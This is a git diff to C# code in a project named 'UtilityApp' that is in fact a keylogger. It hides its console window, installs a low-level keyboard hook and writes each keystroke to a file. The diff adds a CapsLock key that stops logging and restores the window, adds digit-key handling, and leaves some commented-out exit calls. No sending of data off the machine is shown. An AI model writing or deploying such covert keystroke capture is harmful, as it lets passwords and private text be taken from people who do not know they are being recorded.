@@ -17,9 +17,13 @@ namespace UtilityApp
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
         private static StreamWriter sw;
+        private static bool endLogging = false;
 
         public void Run()
         {
+            //Cleanse the variable in case loggin is run twice
+            endLogging = false;
+
             var handle = GetConsoleWindow();
 
             //Hide
@@ -62,17 +66,20 @@ namespace UtilityApp
 
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
-            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN && !endLogging)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
                 KeysConverter kc = new KeysConverter();
                 string output = "";
 
                 //Check if its a letter or numpad to keep the switch to a min
-                if (!IsKeyAChar((Keys)vkCode) && !IsKeyANumPadDigit((Keys)vkCode))
+                if (!IsKeyAChar((Keys)vkCode) && !IsKeyANumPadDigit((Keys)vkCode) && !IsKeyADigit((Keys)vkCode))
                 {
                     switch ((Keys)vkCode)
                     {
+                        case Keys.CapsLock:
+                            endLogging = true;
+                            break;
                         case Keys.Space:
                             output = " ";
                             break;
@@ -91,6 +98,8 @@ namespace UtilityApp
                 {
                     //Is a numpad number. Strip the "NumPad" from the string
                     output = kc.ConvertToString((Keys)vkCode).Substring(6);
+                    //Environment.Exit(0);
+                    //GenerateConsoleCtrlEvent(XConsoleEvent.CTRL_C, 0);
                 }
                 else
                 {
@@ -100,6 +109,15 @@ namespace UtilityApp
                 Console.WriteLine(output);
                 
                 sw.Write(output);
+            }
+            if (endLogging)
+            {
+                ConsoleCtrlCheck(CtrlTypes.CTRL_BREAK_EVENT);
+                //Console.WriteLine("Break event");
+                //Environment.Exit(0);
+                var handle = GetConsoleWindow();
+                ShowWindow(handle, 1);
+                Application.Exit();
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
